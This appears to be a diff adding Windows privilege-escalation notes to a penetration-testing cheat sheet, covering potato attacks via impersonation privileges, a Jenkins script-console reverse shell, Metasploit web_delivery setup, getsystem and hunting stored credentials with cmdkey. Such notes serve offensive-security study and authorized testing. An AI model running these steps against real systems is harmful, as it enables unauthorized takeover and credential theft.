@@ -178,3 +178,62 @@ Alternative escalation method
   - `ls -la`
   - `history`
   - `sudo -l`
+
+## Escalation Path: Impersonation and Potato Attacks
+
+Shell
+- `whomi /priv`
+
+Meterpreter
+- `getprivs`
+
+Key common privileges
+- SeAssignPrimaryToken/SeImpersonate
+  - Run potato attack tools!
+  - Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+  - Juicy Potato: https://github.com/ohpe/juicy-potato
+- SeBackup
+- SeCreateToken
+- SeDebug
+- SeRestore
+- SeTakeOwnership
+
+Jenkins:
+- Manage Jenkins
+  - Script console
+- Run groovy reverse shell
+
+To change shell into meterpreter shell:
+- `msfconsole`
+- `use exploit/multi/script/web_delivery`
+- `targets`
+  - `set target [language]`
+- `options`
+  - `set lhost`
+  - `set lport`
+  - `set srvhost`
+  - `set payload [payload]`
+
+Meterpreter
+- `run post/[exploit]` to run in current session
+  - `run post/multi/recon/local_exploit_suggester`
+
+### Alternate Data Streams
+
+Hidden information within a file.
+- `dir /R`
+- `more < [file]`
+
+## Escalation Path: getsystem
+
+https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+
+High chance of being detected: `getsystem -t 2`
+
+Could crash a machine, so be careful!
+
+## Escalation Path: Runas
+
+Allows us to run a command as someone else.
+
+Look for stored credentials: `cmdkey /list`
